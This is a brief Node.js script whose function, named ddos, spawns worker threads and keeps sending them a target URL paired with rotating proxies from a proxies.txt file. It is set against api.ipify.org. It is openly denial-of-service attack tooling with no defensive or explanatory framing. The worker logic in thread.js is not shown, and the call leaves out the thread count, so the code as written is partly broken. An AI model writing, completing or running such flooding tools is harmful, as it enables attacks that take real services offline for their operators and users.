const { Worker } = require('worker_threads');
const fs = require('fs')

const proxies = fs.readFileSync('./proxies.txt', 'utf-8').split(/\r|\n/g).filter(a=>a)
function ddos(url, threads) {
    const workers = Array(threads).fill().map(() => new Worker("./thread.js"))
    var i = -1
    setInterval(() => {
        workers.forEach(worker => {
            worker.postMessage(`${url}<>${proxies[i = (i+1)%proxies.length]}`)
        })
    })
}

ddos("https://api.ipify.org")